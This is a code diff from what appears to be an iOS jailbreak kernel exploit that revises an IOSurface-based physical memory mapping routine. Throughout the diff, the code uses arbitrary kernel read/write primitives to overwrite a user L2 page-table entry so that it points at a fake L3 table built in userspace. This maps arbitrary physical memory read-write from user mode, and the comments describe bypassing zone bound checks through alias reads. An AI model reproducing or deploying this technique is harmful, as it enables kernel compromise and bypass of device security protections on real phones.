@@ -147,8 +147,26 @@ struct IOSurface_toCleanup {
 	uint64_t *fakeRangesUA;
 };
 
+// v84: single-active L2 redirect state (kmap PTE-retarget path)
+static uint64_t g_l2_addr   = 0;
+static uint64_t g_l2_orig   = 0;
+static int      g_l2_active = 0;
+extern void jb_tr_beacon(const char *fmt, ...);
+
 struct IOSurface_toCleanup *cleanups = NULL;
 unsigned cleanupsCount = 0;
+
+// v84: restore hook — runs at kmap() ENTRY (before any new redirect) and
+// on kernel-panic path teardown (fwscan flush/reboot), making the redirect
+// self-healing: the L2 entry survives only while the exploit wants it.
+void IOSurface_l2_restore(void)
+{
+	if (g_l2_active) {
+		kwrite64(g_l2_addr, g_l2_orig);
+		jb_tr_beacon("KMAP l2,restored,addr=%llx", (unsigned long long)g_l2_addr);
+		g_l2_active = 0;
+	}
+}
 
 int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32_t cacheMode)
 {
@@ -220,60 +238,118 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		return -1;
 	}
 
-	// Walk our own user page tables — v83: 3-LEVEL user walk. v82 data:
-	// root converts (tt,phys/va ✓), root entry ✓ (l1=fffffff20b120000),
-	// but the next read used index (va>>36)=0 while the on-device error
-	// address 0x428 = 8*(va>>25) proves the next index must be va>>25 —
-	// the user walk STARTS at L1 (v81/v82's "l0e" read WAS the L1 entry).
-	// Discriminator: l2alt reads the wrong-index slot for one launch.
-	// OA mask for 16KB granule PTEs: bits [47:14].
+	// v84: L2 REDIRECT. v83 panic (esr 9600004f, far=l3+0x770) proved the
+	// pool's L3 table page alias is UNMAPPED in kernel TTBR1 (carve-out
+	// hole) — the walk can never reach the L3. But the L2 table IS mapped
+	// and writable (l2e read ✓). So: build a fake L3 table in base0's own
+	// backing page (userspace write through the mapping — free), get its
+	// PA from the surface's ranges element read through its PAPT ALIAS
+	// (aliases bypass zone bound checks — the 16B element is unreachable
+	// only at its zone VA), and kwrite64 the L2 entry to point at it.
+	// Restore discipline: original L2 entry saved; restored at next kmap
+	// entry, at l2_restore(), and in cleanup.
 	uint64_t va    = (uint64_t)base0;
 	uint64_t ttP   = ttep_self();
 	uint64_t tt    = phystokv(ttP & 0x0000FFFFFFFFC000ULL);
 	if (!tt) tt = ttP;
+
+	// restore any previous redirect FIRST (one active at a time)
+	if (g_l2_active) {
+		kwrite64(g_l2_addr, g_l2_orig);
+		jb_tr_beacon("KMAP l2,restored,addr=%llx", (unsigned long long)g_l2_addr);
+		g_l2_active = 0;
+	}
+
 	uint64_t l1e   = kread64(tt + 8 * ((va >> 36) & 0x7FF));
 	uint64_t l2    = phystokv(l1e & 0x0000FFFFFFFFC000ULL);
-	uint64_t l2e   = l2 ? kread64(l2 + 8 * ((va >> 25) & 0x7FF)) : 0;
-	uint64_t l2alt = l2 ? kread64(l2 + 8 * ((va >> 36) & 0x7FF)) : 0; // discriminator
-	uint64_t l3    = phystokv(l2e & 0x0000FFFFFFFFC000ULL);
-	uint64_t pteA  = l3 ? (l3 + 8 * ((va >> 14) & 0x7FF)) : 0;
-	jb_tr_beacon("KMAP w,tt=%llx,l1e=%llx,l2=%llx,l2e=%llx,l2alt=%llx,l3=%llx",
-	             (unsigned long long)tt, (unsigned long long)l1e,
-	             (unsigned long long)l2, (unsigned long long)l2e,
-	             (unsigned long long)l2alt, (unsigned long long)l3);
-	if (!l2 || !l3 || !pteA) {
-		jb_tr_beacon("KMAP fail,ptewalk");
+	uint64_t idx2  = (va >> 25) & 0x7FF;
+	if (!l2 || (8 * idx2) > 0x4000 - 0x20) {
+		jb_tr_beacon("KMAP fail,ptewalk,l2=%llx,idx2=%llx",
+		             (unsigned long long)l2, (unsigned long long)idx2);
 		*uaddr = NULL;
 		return -1;
 	}
-	// Sanity: the walk must reproduce what vtophys says about base0 —
-	// otherwise we are looking at the wrong table and MUST NOT write.
-	// vtophys takes the RAW phys root (historical call shape).
-	uint64_t origPte = kread64(pteA);
-	uint64_t walked  = origPte & 0x0000FFFFFFFFC000ULL;
-	uint64_t expect  = vtophys(ttP, va) & ~0x3FFFULL;
-	if (walked != expect) {
-		jb_tr_beacon("KMAP fail,pteverify,walked=%llx,expect=%llx",
-		             (unsigned long long)walked, (unsigned long long)expect);
+	uint64_t origL2e = kread64(l2 + 8 * idx2);
+	if (!(origL2e & 1)) {
+		jb_tr_beacon("KMAP fail,l2e,invalid=%llx", (unsigned long long)origL2e);
 		*uaddr = NULL;
 		return -1;
 	}
-	// Retarget 4 consecutive 16KB pages → the 64KB window. Keep attrs,
-	// drop the old OA (bits 47:14), clear CONTIGUOUS (bit 52) — the target
-	// is 16KB-aligned, not block-aligned with the old mapping.
-	uint64_t attr   = origPte & ~0x0000FFFFFFFFC000ULL;
-	attr           &= ~(1ULL << 52);
+
+	// donor PA: surface ranges element → alias read (no zone check).
+	// surface+0x360 = ranges element KERNEL VA (8B read inside 960B
+	// object — legal). vtophys on the element VA (kalloc-early pages,
+	// normally aliased), then 32B alias read of the 16B element + slack
+	// (NO zone check on alias VAs).
+	uint64_t elemVA = kread64(surface + 0x360);
+	if (!elemVA) {
+		jb_tr_beacon("KMAP fail,elemva");
+		*uaddr = NULL;
+		return -1;
+	}
+	uint64_t elemPA = vtophys(ttP, elemVA) & ~0x3FFFULL;
+	if (!elemPA) {
+		jb_tr_beacon("KMAP fail,elemvtophys");
+		*uaddr = NULL;
+		return -1;
+	}
+	uint64_t elemAlias = phystokv(elemPA);
+	if (!elemAlias) {
+		jb_tr_beacon("KMAP fail,elemalias,pa=%llx", (unsigned long long)elemPA);
+		*uaddr = NULL;
+		return -1;
+	}
+	uint64_t rangesPair[2];
+	kreadbuf(elemAlias, rangesPair, sizeof(rangesPair));
+	uint64_t donorPA = rangesPair[0] & ~0x3FFFULL;
+	jb_tr_beacon("KMAP donor,elemva=%llx,elemalias=%llx,pa=%llx,size=%llx",
+	             (unsigned long long)elemVA, (unsigned long long)elemAlias,
+	             (unsigned long long)donorPA, (unsigned long long)rangesPair[1]);
+	if (!donorPA) {
+		jb_tr_beacon("KMAP fail,donorpa");
+		*uaddr = NULL;
+		return -1;
+	}
+
+	// Build the fake L3 IN base0's first page from USERSPACE (base0 still
+	// maps the donor): zero all slots, then 4 PTEs for the 64KB window.
+	volatile uint64_t *fakeL3 = (volatile uint64_t *)base0;
+	uint64_t slot = (va >> 14) & 0x7FF;
+	for (int i = 0; i < 2048; i++) fakeL3[i] = 0;
 	uint64_t paPage = pa & ~0x3FFFULL;
 	for (int pgi = 0; pgi < 4; pgi++) {
-		uint64_t newPte = attr | ((((paPage + pgi * 0x4000ULL) >> 14) & 0x1FFFFFFFFULL) << 14);
-		kwrite64(pteA + 8 * pgi, newPte);
+		fakeL3[slot + pgi] = 0x341ULL |
+			((((paPage + pgi * 0x4000ULL) >> 14) & 0x1FFFFFFFFULL) << 14);
 	}
-	jb_tr_beacon("KMAP pte,ok,pteA=%llx,pa=%llx,rb0=%llx,rb3=%llx",
-	             (unsigned long long)pteA, (unsigned long long)paPage,
-	             (unsigned long long)kread64(pteA),
-	             (unsigned long long)kread64(pteA + 24));
+	// PTE: Valid | AF(0x400) | SH_ISH(0x300) | AP_EL0RW(0x40), AttrIndx 0.
 
-	// First read through the retargeted mapping — the probe's scan follows.
+	// Redirect the L2 entry → donor page as L3 table (table desc 0x3).
+	uint64_t newL2e = (donorPA & 0x0000FFFFFFFFC000ULL) | 0x3;
+	kwrite64(l2 + 8 * idx2, newL2e);
+	uint64_t rbL2e = kread64(l2 + 8 * idx2);
+	g_l2_addr = l2 + 8 * idx2;
+	g_l2_orig = origL2e;
+	g_l2_active = 1;
+	jb_tr_beacon("KMAP l2,redirect,addr=%llx,old=%llx,new=%llx,rb=%llx",
+	             (unsigned long long)g_l2_addr, (unsigned long long)origL2e,
+	             (unsigned long long)newL2e, (unsigned long long)rbL2e);
+	if (rbL2e != newL2e) {
+		jb_tr_beacon("KMAP fail,l2write");
+		kwrite64(g_l2_addr, g_l2_orig);
+		g_l2_active = 0;
+		*uaddr = NULL;
+		return -1;
+	}
+
+	// TLB: evict stale translations for our ASID by touching a large
+	// buffer (EL0 cannot TLBI; pressure + natural context switches evict).
+	{
+		static uint64_t *thrash;
+		if (!thrash) thrash = malloc(64ULL << 20);
+		for (uint64_t off = 0; off < (64ULL << 20); off += 0x4000)
+			(void)*(volatile uint64_t *)((uint8_t *)thrash + off);
+	}
+
 	jb_tr_beacon("KMAP PTE,first=%llx,%llx",
 	             (unsigned long long)*(volatile uint64_t *)base0,
 	             (unsigned long long)((volatile uint64_t *)base0)[1]);
@@ -287,6 +363,8 @@ int IOSurface_map(uint64_t pa, uint64_t size, void **uaddr) {
 
 void IOSurface_map_cleanup(void)
 {
+	IOSurface_l2_restore(); // v84: never leave the L2 redirect dangling
+
 	if (cleanupsCount == 0) return;
 
 	for (unsigned i = 0; i < cleanupsCount; i++) {
